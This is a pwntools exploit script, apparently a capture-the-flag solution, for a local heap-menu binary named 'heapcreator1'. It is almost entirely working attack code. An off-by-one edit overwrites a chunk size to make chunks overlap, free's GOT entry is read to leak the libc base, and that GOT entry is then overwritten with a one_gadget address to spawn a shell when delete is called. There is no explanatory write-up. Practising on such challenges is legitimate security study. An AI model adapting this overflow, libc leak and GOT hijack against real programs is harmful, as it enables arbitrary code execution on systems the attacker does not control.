#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./heapcreator1')
libc = ELF('libc.so.6')
p = process('./heapcreator1')

def create(size, content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of Heap : ')
    p.sendline(str(size))
    p.recvuntil('Content of heap:')
    p.sendline(content)

def edit(index, content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
    p.recvuntil('Content of heap : ')
    p.send(content)

def show(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))

def delete(index):
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil('Index :')
    p.sendline(str(index))

def debug():
    gdb.attach(p)
    pause()

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']

create(0x18,'123')# 0
create(0x10,'123')# 1

edit(0,p64(puts_got)+0x10*b'a'+p8(0x41))# 这个很神奇。。。 不能把 Chunk_head free 了 但是可以 free 掉 data 部分

delete(1)

# leak_libc
create(0x30,0x18*b'a'+p64(0x21)+p64(12)+p64(free_got))# 1


# delete(0)
show(1)
free_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('free_addr: ' + hex(free_addr))
libc.address = free_addr-libc.sym['free']
log.success('libc.address: ' + hex(libc.address))
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))
binsh_addr = next(libc.search(b'/bin/sh'))
log.success('binsh_addr: ' + hex(binsh_addr))



# hijack free_got
one_addr = libc.address + 0xf02a4
edit(1,p64(one_addr))
# debug()
delete(1)
p.interactive()
